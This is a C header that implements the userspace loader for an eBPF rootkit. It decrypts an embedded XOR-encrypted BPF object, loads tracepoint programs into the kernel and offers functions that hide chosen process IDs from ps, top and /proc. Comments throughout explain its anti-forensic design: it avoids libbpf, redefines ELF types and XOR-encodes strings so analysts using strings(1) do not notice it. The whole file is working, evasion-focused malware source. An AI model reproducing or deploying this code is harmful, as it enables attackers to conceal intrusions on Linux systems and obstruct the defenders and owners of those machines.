/*
 * bpf_load.h — Minimal eBPF ELF loader (single-header, no libbpf)
 *
 * ── What this file does ───────────────────────────────────────────────
 * It loads the eBPF rootkit (bpf_rootkit.bpf.c compiled to an ELF object)
 * into the Linux kernel WITHOUT using the standard libbpf library.
 *
 * Why avoid libbpf?
 *   libbpf is the official helper library for loading eBPF programs. Using
 *   it would leave an obvious "libbpf.so" dependency in the binary, flag
 *   BPF-related strings in `strings` output, and link against libelf.
 *   This custom loader parses the ELF format manually and calls the raw
 *   bpf() syscall directly, leaving a much smaller forensic footprint.
 *
 * ── What is eBPF? ────────────────────────────────────────────────────
 * eBPF (extended Berkeley Packet Filter) is a Linux kernel subsystem that
 * allows loading small sandboxed programs into the kernel without writing
 * a kernel module. The kernel verifies them before execution (bounds checks,
 * no unbounded loops, etc.) and then JIT-compiles them to native machine code.
 * Originally for network filtering, they are now used for tracing, profiling,
 * and — in this case — hiding processes and network connections.
 *
 * ── Loading pipeline ────────────────────────────────────────────────
 * The rootkit ELF object is stored XOR-encrypted in bpf_rootkit_obj.h
 * (a C header containing a byte array). The loader:
 *  1. XOR-decrypts the embedded ELF into a malloc'd buffer
 *  2. Creates kernel maps (bpf() BPF_MAP_CREATE) — these are hash tables
 *     shared between kernel-side BPF programs and userspace
 *  3. Patches BPF_LD_IMM64 instructions with real kernel map file descriptors
 *     (ELF relocations: the compiler left placeholder zeros where map FDs go)
 *  4. Loads each BPF program (bpf() BPF_PROG_LOAD) into the kernel verifier
 *  5. Attaches each program to its tracepoint via perf_event_open + ioctl
 *     (tracepoints fire on specific kernel events, e.g., every getdents64 call)
 *
 * Usage:
 *   BpfHider h;
 *   if (bpf_hider_init(&h, enc_obj, obj_len, xor_key) == 0) {
 *       bpf_hider_add_pid(&h, getpid());  // hide ourselves from ps/top
 *   }
 */
#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/bpf.h>
#include <linux/perf_event.h>

/* ── syscall wrappers ────────────────────────────────────────────────────
 * The bpf() syscall is the kernel interface for ALL eBPF operations:
 * creating maps, loading programs, querying program lists, etc.
 * The 'cmd' parameter selects the operation (BPF_MAP_CREATE, BPF_PROG_LOAD...).
 * We call it via syscall() to avoid linking against glibc's bpf wrapper,
 * which would add symbols visible in strace/ltrace output.
 *
 * perf_event_open() creates a performance event counter/probe. When used with
 * PERF_TYPE_TRACEPOINT and a tracepoint ID, it gives us a file descriptor
 * that we can attach an eBPF program to via ioctl(PERF_IOC_SET_BPF).
 */
static inline long _bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}
static inline long _perf_event_open(struct perf_event_attr *attr, pid_t pid,
                                     int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* ── ELF64 types (redefined here to avoid #include <elf.h>) ─────────────
 * We manually declare the ELF structures we need instead of including <elf.h>.
 * Why? Including <elf.h> adds readable strings to the binary and is a clear
 * indicator that the binary loads ELF files. Using our own typedef with
 * neutral names is less conspicuous.
 *
 * ELF (Executable and Linkable Format) is the standard binary format on Linux.
 * A compiled eBPF object is an ELF file with special sections:
 *   "maps"          → map definitions (bpf_map_def structs)
 *   "tracepoint/…"  → BPF bytecode programs (one per hook)
 *   ".rel…"         → relocation entries (which instructions need map FD patching)
 *   "license"       → license string (must be "GPL" for some BPF helpers)
 *
 * Elf64_Ehdr : the 64-byte ELF file header at offset 0
 *   e_shoff    : offset of the section header table
 *   e_shnum    : number of sections
 *   e_shstrndx : index of the section that holds section name strings
 *
 * Elf64_Shdr : one entry in the section header table (per section)
 *   sh_name   : offset into the string table (e_shstrndx section)
 *   sh_type   : 1=PROGBITS (code/data), 2=SYMTAB (symbols), 9=REL (relocations)
 *   sh_offset : byte offset of this section's data in the file
 *   sh_size   : byte size of this section
 *   sh_link   : for SYMTAB: index of the associated string table section
 *
 * Elf64_Sym : one entry in the symbol table (function/variable names)
 *   st_name   : offset into the symbol string table
 *   st_shndx  : which section this symbol belongs to (e.g., index of "maps")
 *   st_value  : offset within that section (for maps: offset into maps section)
 *
 * Elf64_Rel : one relocation entry (tells us where to patch a map reference)
 *   r_offset  : byte offset in the program bytecode to patch
 *   r_info    : upper 32 bits = symbol index, lower 32 bits = relocation type
 */
typedef struct {
    uint8_t  e_ident[16];      /* magic bytes \x7fELF + class/endian/OS info */
    uint16_t e_type, e_machine;
    uint32_t e_version;
    uint64_t e_entry, e_phoff, e_shoff;  /* e_shoff = offset to section headers */
    uint32_t e_flags;
    uint16_t e_ehsize, e_phentsize, e_phnum;
    uint16_t e_shentsize, e_shnum, e_shstrndx;
} Elf64_Ehdr;

typedef struct {
    uint32_t sh_name, sh_type;           /* sh_type: 1=PROGBITS, 2=SYMTAB, 9=REL */
    uint64_t sh_flags, sh_addr, sh_offset, sh_size;
    uint32_t sh_link, sh_info;           /* sh_link for SYMTAB: index of strtab section */
    uint64_t sh_addralign, sh_entsize;
} Elf64_Shdr;

typedef struct {
    uint32_t st_name;    /* offset into string table */
    uint8_t  st_info, st_other;
    uint16_t st_shndx;  /* which section does this symbol live in */
    uint64_t st_value, st_size;
} Elf64_Sym;

typedef struct {
    uint64_t r_offset;  /* byte offset within the target section to patch */
    uint64_t r_info;    /* upper 32b = symbol index, lower 32b = reloc type */
} Elf64_Rel;

/* Extract symbol index and relocation type from r_info */
#define ELF64_R_SYM(i)  ((uint32_t)((i) >> 32))
#define ELF64_R_TYPE(i) ((uint32_t)((i) & 0xffffffff))

/* ── BPF instruction format ──────────────────────────────────────────────
 * Each eBPF instruction is exactly 8 bytes:
 *   code (1B) : opcode (operation type: ALU, load, store, jump, call...)
 *   regs (1B) : destination register (bits 0-3) + source register (bits 4-7)
 *   off  (2B) : signed offset for memory operations and jumps
 *   imm  (4B) : immediate value (constant embedded in the instruction)
 *
 * eBPF has 11 64-bit registers (r0-r10) + a read-only frame pointer (r10).
 * The "regs" byte packs both dst and src into one byte: dst = regs & 0xF,
 * src = (regs >> 4) & 0xF.
 */
struct _bpf_insn {
    uint8_t  code;
    uint8_t  regs;    /* dst = regs & 0xF, src = (regs >> 4) & 0xF */
    int16_t  off;
    int32_t  imm;
};

/* BPF_LD_IMM64 (opcode 0x18): a special 16-byte instruction (two consecutive
 * struct _bpf_insn slots) that loads a 64-bit immediate value into a register.
 * BPF programs use this to reference a map: the compiler emits a BPF_LD_IMM64
 * with a placeholder value of 0, and sets src_reg = BPF_PSEUDO_MAP_FD (=1)
 * to signal "this is a map file descriptor reference."
 * The loader must patch the 'imm' field with the real kernel map FD before
 * calling BPF_PROG_LOAD, otherwise the verifier will reject the program. */
#define BPF_INS_LD_IMM64 0x18       /* opcode for the 16-byte map load instruction */
#define BPF_PSEUDO_MAP_FD 1         /* src_reg value meaning "imm = map fd" */

/* ── bpf_map_def (old-style definition, no BTF or libbpf needed) ────────
 * A BPF map is a kernel data structure accessible from both kernel-side BPF
 * programs and userspace. Think of it as a shared hash table or array.
 *
 * In the "old-style" approach (before BTF/CO-RE), a map is declared in the
 * ELF "maps" section as a bpf_map_def struct. The loader reads these structs
 * and calls BPF_MAP_CREATE for each one.
 *
 * Types used in this project:
 *   BPF_MAP_TYPE_HASH (1): general-purpose hash map (key → value)
 *     - pid_buf_map: pid_tgid → userspace buffer pointer
 *     - pids_to_hide: PID → 1 (which PIDs to hide from /proc)
 *     - udp_fds: pid_tgid → open fd number for /proc/net/udp
 *     etc.
 */
struct _bpf_map_def {
    uint32_t type;          /* BPF_MAP_TYPE_HASH=1, BPF_MAP_TYPE_ARRAY=2, etc. */
    uint32_t key_size;      /* size in bytes of each key (e.g., sizeof(u32) for PIDs) */
    uint32_t value_size;    /* size in bytes of each value (e.g., sizeof(u8) for a flag) */
    uint32_t max_entries;   /* maximum number of entries the map can hold */
    uint32_t map_flags;     /* optional flags (0 for default) */
};

/* ── perf event constants ────────────────────────────────────────────────
 * These ioctl codes control perf event file descriptors.
 * The attachment chain for a BPF tracepoint program is:
 *   1. perf_event_open(PERF_TYPE_TRACEPOINT, tracepoint_id) → pfd
 *      (creates a monitoring point for the kernel tracepoint)
 *   2. ioctl(pfd, PERF_IOC_SET_BPF, prog_fd)
 *      (tells the kernel: "when this tracepoint fires, run this BPF program")
 *   3. ioctl(pfd, PERF_IOC_ENABLE, 0)
 *      (arm the tracepoint — BPF program now runs on every matching syscall)
 *
 * The perf FD must stay open for the BPF program to remain active.
 * Closing pfd detaches the BPF program from the tracepoint.
 * This is why BpfHider stores all perf_fds[] — they must not be closed.
 *
 * PERF_FLAG_FD_CLOEXEC: automatically close the perf fd if the process
 * calls exec(). Prevents the fd from leaking into child processes.
 */
#ifndef PERF_FLAG_FD_CLOEXEC
#define PERF_FLAG_FD_CLOEXEC (1UL << 3)
#endif
#define PERF_IOC_SET_BPF  _IOW('$', 8, uint32_t)  /* attach BPF prog to perf event */
#define PERF_IOC_ENABLE   _IO ('$', 0)             /* arm the perf event (start firing) */

/* ── BpfHider: the rootkit's runtime state ───────────────────────────────
 * This structure is allocated once and kept alive for the entire lifetime
 * of the agent process. It holds all the file descriptors that keep the
 * rootkit active in the kernel.
 *
 * pids_map_fd:
 *   File descriptor for the "pids_to_hide" BPF map. This is a kernel hash
 *   table (key=PID u32, value=u8 flag). The agent uses bpf_hider_add_pid()
 *   to insert PIDs it wants hidden (its own PID, child PIDs, etc.).
 *   The BPF program running in the kernel reads this map on every getdents64
 *   call to know which /proc/<PID> entries to suppress.
 *
 * perf_fds[]:
 *   Array of perf event file descriptors, one per BPF program attached.
 *   MUST remain open: closing any of them unloads the corresponding BPF hook.
 *   The hooks disappear from the kernel the moment their perf fd is closed,
 *   so these are kept alive until bpf_hider_cleanup() is called.
 *
 * n_perf:
 *   Number of successfully attached BPF programs (= number of valid perf_fds).
 *   bpf_hider_init() requires at least 7 to succeed (process+network core).
 */
#define BPF_MAX_PROGS 15
typedef struct {
    int pids_map_fd;              /* kernel map fd: insert PIDs here to hide them */
    int perf_fds[BPF_MAX_PROGS]; /* perf event fds — must stay open to keep hooks active */
    int n_perf;                   /* count of successfully loaded programs */
} BpfHider;

/* ── Internal helpers ────────────────────────────────────────────────────
 * These functions are not part of the public API (prefixed with _).
 * They wrap individual bpf() syscall operations.
 */

/* _bpf_create_map : ask the kernel to create an eBPF map.
 * Returns a file descriptor (>= 0) on success, or -1 on failure.
 * Common failure reasons:
 *   - EPERM (1): not root / missing CAP_BPF capability
 *   - ENOMEM  : kernel cannot allocate memory for max_entries items
 */
static inline int _bpf_create_map(struct _bpf_map_def *def) {
    union bpf_attr attr = {};
    attr.map_type    = def->type;
    attr.key_size    = def->key_size;
    attr.value_size  = def->value_size;
    attr.max_entries = def->max_entries;
    attr.map_flags   = def->map_flags;
    return (int)_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

/* _bpf_load_prog : submit a BPF program to the kernel verifier and load it.
 * The kernel runs a static analysis ("verifier") on every BPF program before
 * loading it. The verifier checks:
 *   - No unbounded loops (all loops must terminate in a bounded number of steps)
 *   - No out-of-bounds memory accesses
 *   - No use-after-free or uninitialized reads
 *   - Correct use of BPF helper functions
 * If the verifier rejects the program, it writes an error message to log_buf.
 *
 * We attempt the load twice:
 *   1st: with log_buf (captures verifier errors for debugging)
 *   2nd: without log_buf (cleaner, no log memory overhead)
 * The 2nd attempt is a fallback in case the kernel version doesn't support
 * certain log_level combinations.
 *
 * BPF_PROG_TYPE_TRACEPOINT: this program type runs when a kernel tracepoint
 * fires (e.g., sys_enter_getdents64). The context (ctx) passed to the program
 * contains the syscall arguments.
 *
 * Returns the program FD (>= 0) on success, or -1 if the verifier rejects it.
 */
static inline int _bpf_load_prog(struct _bpf_insn *insns, uint32_t insn_cnt,
                                  const char *license) {
    char log_buf[4096] = {};
    union bpf_attr attr = {};
    attr.prog_type     = BPF_PROG_TYPE_TRACEPOINT;
    attr.insns         = (uint64_t)(uintptr_t)insns;  /* pointer to bytecode array */
    attr.insn_cnt      = insn_cnt;                     /* number of 8-byte instructions */
    attr.license       = (uint64_t)(uintptr_t)license; /* must be "GPL" for probe_write_user */
    attr.log_buf       = (uint64_t)(uintptr_t)log_buf;
    attr.log_size      = sizeof(log_buf);
    attr.log_level     = 1;                            /* 1 = include verifier messages */
    int fd = (int)_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    /* log_buf now contains verifier diagnostics if fd < 0 */
    (void)fd;
    /* Retry without the log buffer — some older kernels behave better without it */
    if (fd < 0) {
        union bpf_attr a2 = {};
        a2.prog_type = BPF_PROG_TYPE_TRACEPOINT;
        a2.insns     = (uint64_t)(uintptr_t)insns;
        a2.insn_cnt  = insn_cnt;
        a2.license   = (uint64_t)(uintptr_t)license;
        fd = (int)_bpf(BPF_PROG_LOAD, &a2, sizeof(a2));
    }
    return fd;
}

/* ── Tracepoint ID lookup with XOR-obfuscated path strings ──────────────
 * To attach a BPF program to a tracepoint (e.g., sys_enter_getdents64),
 * we need its numeric ID, which Linux exposes in a file:
 *   /sys/kernel/tracing/events/<category>/<name>/id
 *   (or /sys/kernel/debug/tracing/... on older kernels)
 *
 * Example: `cat /sys/kernel/tracing/events/syscalls/sys_enter_getdents64/id`
 * might print "642" — that's the tracepoint ID we pass to perf_event_open().
 *
 * Why XOR-encode the path strings?
 *   The `strings` command extracts printable strings from a binary and is
 *   commonly used in forensic analysis. If "/sys/kernel/tracing/events" were
 *   a literal string, it would immediately reveal that this binary loads BPF
 *   programs. XOR-encoding the paths with BL_KEY=0xD3 makes them invisible
 *   to strings(1) while remaining trivially recoverable at runtime.
 *
 *   _bl_dec() is marked noinline + optimize("O0") to prevent the compiler
 *   from constant-folding the decode loop at compile time (which would put the
 *   plain string back into the binary as a literal).
 *
 * BL_KEY = 0xD3 (decimal 211) — the XOR key for all obfuscated strings here.
 */
#define BL_KEY 0xD3u

__attribute__((noinline, optimize("O0")))
static void _bl_dec(const uint8_t *enc, int n, char *out) {
    /* Decode: plain[i] = encoded[i] ^ BL_KEY. XOR is its own inverse. */
    for (int _i = 0; _i < n; _i++) out[_i] = (char)(enc[_i] ^ BL_KEY);
    out[n] = '\0';
}

/* XOR-encoded "/sys/kernel/tracing/events/%s/id" (32 bytes)
 * Decode with BL_KEY=0xD3 to get the printf format string.
 * Used as the primary tracefs path (modern kernels). */
static const uint8_t _bl_tpath1[] = {
    0xfc,0xa0,0xaa,0xa0,0xfc,0xb8,0xb6,0xa1,0xbd,0xb6,0xbf,0xfc,
    0xa7,0xa1,0xb2,0xb0,0xba,0xbd,0xb4,0xfc,0xb6,0xa5,0xb6,0xbd,
    0xa7,0xa0,0xfc,0xf6,0xa0,0xfc,0xba,0xb7};
/* XOR-encoded "/sys/kernel/debug/tracing/events/%s/id" (38 bytes)
 * Fallback path for kernels that mount tracefs under debugfs. */
static const uint8_t _bl_tpath2[] = {
    0xfc,0xa0,0xaa,0xa0,0xfc,0xb8,0xb6,0xa1,0xbd,0xb6,0xbf,0xfc,
    0xb7,0xb6,0xb1,0xa6,0xb4,0xfc,0xa7,0xa1,0xb2,0xb0,0xba,0xbd,
    0xb4,0xfc,0xb6,0xa5,0xb6,0xbd,0xa7,0xa0,0xfc,0xf6,0xa0,0xfc,
    0xba,0xb7};
/* XOR-encoded "tracepoint/" (11 bytes)
 * Used to detect BPF program sections in the ELF (sections named "tracepoint/...").
 * strncmp in bpf_hider_init uses this to skip non-program sections. */
static const uint8_t _bl_tp_pfx[] = {
    0xa7,0xa1,0xb2,0xb0,0xb6,0xa3,0xbc,0xba,0xbd,0xa7,0xfc};

/* _tp_id : look up a tracepoint's numeric ID from tracefs.
 * tp_name is the tracepoint path without the mount prefix,
 * e.g., "syscalls/sys_enter_getdents64".
 * Tries the modern tracefs path first, falls back to debugfs.
 * Returns the integer ID, or -1 if the tracepoint doesn't exist.
 */
static inline int _tp_id(const char *tp_name) {
    char path[256];
    char fmt1[36], fmt2[42];
    /* Decode the path format strings at runtime (they are XOR-obfuscated) */
    _bl_dec(_bl_tpath1, (int)sizeof(_bl_tpath1), fmt1);
    snprintf(path, sizeof(path), fmt1, tp_name);   /* e.g., "/sys/kernel/tracing/events/syscalls/sys_enter_getdents64/id" */
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        /* Try the legacy debugfs path (/sys/kernel/debug/tracing/...) */
        _bl_dec(_bl_tpath2, (int)sizeof(_bl_tpath2), fmt2);
        snprintf(path, sizeof(path), fmt2, tp_name);
        fd = open(path, O_RDONLY);
    }
    if (fd < 0) return -1;   /* tracepoint not found (wrong kernel, different config) */
    char buf[16] = {};
    (void)read(fd, buf, sizeof(buf)-1);  /* read the ASCII decimal ID, e.g., "642\n" */
    close(fd);
    /* Manual atoi: parse digits until a non-digit is encountered */
    int r=0; const char *p=buf; while(*p>='0'&&*p<='9')r=r*10+(*p++-'0'); return r;
}

/* _attach_tp : attach a loaded BPF program to a tracepoint by its numeric ID.
 * The three-step attachment sequence:
 *   1. perf_event_open → gets a monitoring fd for the tracepoint
 *   2. PERF_IOC_SET_BPF → links the BPF program to the monitoring fd
 *   3. PERF_IOC_ENABLE  → arms it (starts firing BPF code on each event)
 *
 * pid=-1, cpu=0, group_fd=-1 means: monitor all processes on CPU 0, standalone.
 * Returns the perf fd (must be kept open), or -1 on failure.
 */
static inline int _attach_tp(int tp_id_val, int prog_fd) {
    struct perf_event_attr pattr = {};
    pattr.type          = PERF_TYPE_TRACEPOINT;  /* we're monitoring a tracepoint */
    pattr.size          = sizeof(pattr);
    pattr.config        = (uint64_t)tp_id_val;   /* which tracepoint (numeric ID) */
    pattr.sample_period = 1;    /* fire on every occurrence (not periodic sampling) */
    pattr.wakeup_events = 1;
    /* pid=-1: all processes; cpu=0: CPU 0; group_fd=-1: standalone */
    int pfd = (int)_perf_event_open(&pattr, -1, 0, -1, PERF_FLAG_FD_CLOEXEC);
    if (pfd < 0) return -1;
    if (ioctl(pfd, PERF_IOC_SET_BPF, prog_fd) < 0) { close(pfd); return -1; }
    if (ioctl(pfd, PERF_IOC_ENABLE, 0) < 0)         { close(pfd); return -1; }
    return pfd;  /* caller stores this fd; closing it unloads the hook */
}

/* ══════════════════════════════════════════════════════════════════════
 * bpf_hider_init — decrypts the embedded BPF ELF (XOR 32B), parses it,
 *                  creates maps, loads progs, attaches to tracepoints.
 * Returns 0 on success, -1 on error (insufficient capabilities or kernel too old).
 * ══════════════════════════════════════════════════════════════════════ */
static int bpf_hider_init(BpfHider *h,
                           const uint8_t *enc_data, size_t enc_len,
                           const uint8_t key[32])
{
    memset(h, 0, sizeof(*h));
    h->pids_map_fd = -1;
    for (int i = 0; i < BPF_MAX_PROGS; i++) h->perf_fds[i] = -1;

    /* ── Decrypt the XOR-encrypted ELF object ────────────────────────── */
    if (enc_len < sizeof(Elf64_Ehdr)) return -1;
    uint8_t *elf_data = (uint8_t *)malloc(enc_len);
    if (!elf_data) return -1;
    for (size_t _i = 0; _i < enc_len; _i++)
        elf_data[_i] = enc_data[_i] ^ key[_i & 31];
    size_t elf_len = enc_len;

    /* Verify ELF magic after decryption */
    if (memcmp(elf_data, "\x7f""ELF", 4) != 0) { free(elf_data); return -1; }

    const Elf64_Ehdr *eh = (const Elf64_Ehdr *)elf_data;
    if (memcmp(eh->e_ident, "\x7f""ELF", 4) != 0) return -1;

    /* ── Locate sections ─────────────────────────────────────── */
    const Elf64_Shdr *shdrs = (const Elf64_Shdr *)(elf_data + eh->e_shoff);
    const char *shstrtab = (const char *)(elf_data +
                            shdrs[eh->e_shstrndx].sh_offset);

    /* Track: maps_idx, symtab_idx, license section */
    int maps_idx   = -1;
    int symtab_idx = -1;
    const char *license_str = "GPL";

    for (int i = 0; i < eh->e_shnum; i++) {
        const char *name = shstrtab + shdrs[i].sh_name;
        if (strcmp(name, "maps") == 0)    maps_idx   = i;
        if (shdrs[i].sh_type == 2 /*SHT_SYMTAB*/) symtab_idx = i;
        if (strcmp(name, "license") == 0)
            license_str = (const char *)(elf_data + shdrs[i].sh_offset);
    }

    if (maps_idx < 0 || symtab_idx < 0) return -1;

    /* ── Create maps ──────────────────────────────────────────────── */
    /* Space for up to 32 maps */
    int map_fds[64] = {};  /* map_fds[sym_idx] = fd */
    memset(map_fds, -1, sizeof(map_fds));

    const Elf64_Sym *syms = (const Elf64_Sym *)(elf_data +
                             shdrs[symtab_idx].sh_offset);
    int n_syms = (int)(shdrs[symtab_idx].sh_size / sizeof(Elf64_Sym));
    const char *strtab = (const char *)(elf_data +
                          shdrs[shdrs[symtab_idx].sh_link].sh_offset);

    for (int i = 0; i < n_syms && i < 64; i++) {
        if (syms[i].st_shndx != (uint16_t)maps_idx) continue;
        /* Map definition at st_value in the maps section */
        const struct _bpf_map_def *mdef =
            (const struct _bpf_map_def *)(elf_data +
             shdrs[maps_idx].sh_offset + syms[i].st_value);
        int fd = _bpf_create_map((struct _bpf_map_def *)mdef);
        if (fd < 0) return -1;
        map_fds[i] = fd;

        /* Identify the "pids_to_hide" map by name comparison.
         * The map name is XOR-encoded (BL_KEY=0xD3) to avoid "pids_to_hide"
         * appearing as a plain string in the loader binary.
         * _bl_dec decodes it to "pids_to_hide" at runtime for strcmp. */
        static const uint8_t _bl_pids_nm[] = {
            0xA3,0xBA,0xB7,0xA0,0x8C,0xA7,0xBC,0x8C,0xBB,0xBA,0xB7,0xB6};
        const char *sym_name = strtab + syms[i].st_name;
        char _pids_dec[13]; _bl_dec(_bl_pids_nm, 12, _pids_dec);  /* → "pids_to_hide" */
        if (strcmp(sym_name, _pids_dec) == 0)
            h->pids_map_fd = fd;  /* save the fd so userspace can add/remove PIDs */
    }

    if (h->pids_map_fd < 0) return -1;

    /* ── Load programs (one prog section per tracepoint) ────── */
    for (int si = 0; si < eh->e_shnum; si++) {
        const Elf64_Shdr *sh = &shdrs[si];
        if (sh->sh_type != 1 /*SHT_PROGBITS*/) continue;

        const char *sname = shstrtab + sh->sh_name;
        /* Program sections start with "tracepoint/" */
        char _tp_pfx_dec[12]; _bl_dec(_bl_tp_pfx, 11, _tp_pfx_dec);
        if (strncmp(sname, _tp_pfx_dec, 11) != 0) continue;
        if (sh->sh_size == 0) continue;

        /* Copy bytecode (mutable for patching) */
        uint8_t *prog_copy = (uint8_t *)malloc(sh->sh_size);
        if (!prog_copy) return -1;
        memcpy(prog_copy, elf_data + sh->sh_offset, sh->sh_size);

        /* ── Apply ELF relocations ──────────────────────────────────────
         * When clang compiles a BPF program that uses a map, it emits a
         * BPF_LD_IMM64 instruction with imm=0 (placeholder) and creates a
         * relocation entry in a ".rel<section_name>" section. The relocation
         * says: "at byte offset R, put the file descriptor of map symbol S."
         *
         * We must perform this step ourselves (libbpf normally does it).
         * Process: find the ".rel" section for our program section, iterate
         * each relocation entry, and patch the corresponding BPF instruction
         * in our in-memory copy of the bytecode.
         *
         * After patching, each BPF_LD_IMM64 instruction's imm field contains
         * the actual kernel map FD, and src_reg is set to BPF_PSEUDO_MAP_FD
         * so the kernel verifier knows to resolve it as a map reference.
         */
        char relname[256];
        snprintf(relname, sizeof(relname), ".rel%s", sname);  /* e.g., ".reltracepoint/syscalls/..." */

        for (int ri = 0; ri < eh->e_shnum; ri++) {
            if (shdrs[ri].sh_type != 9 /*SHT_REL*/) continue;
            if (strcmp(shstrtab + shdrs[ri].sh_name, relname) != 0) continue;

            int n_rels = (int)(shdrs[ri].sh_size / sizeof(Elf64_Rel));
            const Elf64_Rel *rels = (const Elf64_Rel *)
                (elf_data + shdrs[ri].sh_offset);

            for (int ri2 = 0; ri2 < n_rels; ri2++) {
                uint32_t sym_idx  = ELF64_R_SYM(rels[ri2].r_info);   /* index into symbol table */
                uint64_t insn_off = rels[ri2].r_offset;               /* byte offset in bytecode */

                if (sym_idx >= 64 || map_fds[sym_idx] < 0) continue;  /* unknown or uncreated map */

                /* Navigate to the instruction that needs patching */
                struct _bpf_insn *insn =
                    (struct _bpf_insn *)(prog_copy + insn_off);
                /* Safety: verify this is actually a BPF_LD_IMM64 instruction */
                if (insn->code != BPF_INS_LD_IMM64) continue;
                /* Patch: set src_reg = BPF_PSEUDO_MAP_FD (tells verifier this imm is a map fd)
                 * and set imm = the real kernel file descriptor for this map */
                insn->regs = (insn->regs & 0x0f) | (BPF_PSEUDO_MAP_FD << 4);
                insn->imm  = map_fds[sym_idx];
            }
            break;
        }

        /* ── Load program ────────────────────────────────────── */
        int prog_fd = _bpf_load_prog((struct _bpf_insn *)prog_copy,
                                     (uint32_t)(sh->sh_size / 8),
                                     license_str);
        free(prog_copy);
        if (prog_fd < 0) continue;  /* silent failure if not root */

        /* ── Attach to tracepoint ──────────────────────────────────── *
         * sname = "tracepoint/syscalls/sys_enter_getdents64"
         * tp_path = "syscalls/sys_enter_getdents64"                     */
        const char *tp_path = sname + 11;  /* skip "tracepoint/" */
        int tp_id_val = _tp_id(tp_path);
        if (tp_id_val <= 0) { close(prog_fd); continue; }

        int pfd = _attach_tp(tp_id_val, prog_fd);
        close(prog_fd);  /* prog fd can be closed after attachment */
        if (pfd >= 0 && h->n_perf < BPF_MAX_PROGS)
            h->perf_fds[h->n_perf++] = pfd;
    }

    free(elf_data);  /* free the temporary decrypted buffer */
    return (h->n_perf >= 7) ? 0 : -1;  /* 11 programs total: at least 7 required (process+network hider core) */
}

/* ── Public API ─────────────────────────────────────────────────────────
 * These three functions are the only interface userspace needs after init.
 */

/* bpf_hider_add_pid : tell the kernel rootkit to hide a specific PID.
 *
 * Inserts pid→1 into the "pids_to_hide" BPF hash map (BPF_MAP_UPDATE_ELEM).
 * The kernel-side BPF program (running on every getdents64 call) checks this
 * map for each /proc/<number> directory entry it sees. If the PID is present,
 * the entry is removed from the dirent buffer before the syscall returns
 * to userspace — making it invisible to ps, top, ls /proc, etc.
 *
 * Typical usage:
 *   bpf_hider_add_pid(&h, getpid());   // hide the agent itself
 *   bpf_hider_add_pid(&h, child_pid);  // hide a child process
 *
 * BPF_ANY flag: create the entry if it doesn't exist, update if it does.
 */
static inline void bpf_hider_add_pid(BpfHider *h, uint32_t pid) {
    if (h->pids_map_fd < 0) return;  /* rootkit not loaded, nothing to do */
    uint8_t val = 1;                  /* the value doesn't matter, only key presence is checked */
    union bpf_attr attr = {};
    attr.map_fd = (uint32_t)h->pids_map_fd;
    attr.key    = (uint64_t)(uintptr_t)&pid;   /* pointer to the key (PID) */
    attr.value  = (uint64_t)(uintptr_t)&val;   /* pointer to the value */
    attr.flags  = BPF_ANY;                     /* insert or update */
    _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

/* bpf_hider_del_pid : stop hiding a PID (e.g., after a child process exits).
 * Removes the entry from the map. The PID becomes visible again in ps/top.
 */
static inline void bpf_hider_del_pid(BpfHider *h, uint32_t pid) {
    if (h->pids_map_fd < 0) return;
    union bpf_attr attr = {};
    attr.map_fd = (uint32_t)h->pids_map_fd;
    attr.key    = (uint64_t)(uintptr_t)&pid;
    _bpf(BPF_MAP_DELETE_ELEM, &attr, sizeof(attr));
}

/* bpf_hider_cleanup : unload ALL BPF hooks and release resources.
 * Closing the perf event fds detaches the BPF programs from their tracepoints.
 * Closing pids_map_fd destroys the shared map (the kernel cleans up).
 * After this call, the rootkit is completely unloaded from the kernel.
 * PIDs are immediately visible again in ps/top/netstat.
 */
static inline void bpf_hider_cleanup(BpfHider *h) {
    for (int i = 0; i < h->n_perf; i++)
        if (h->perf_fds[i] >= 0) close(h->perf_fds[i]);  /* detaches BPF program */
    if (h->pids_map_fd >= 0) close(h->pids_map_fd);       /* destroys the shared map */
    memset(h, 0, sizeof(*h));   /* clear all fds to prevent double-close */
    h->pids_map_fd = -1;
}
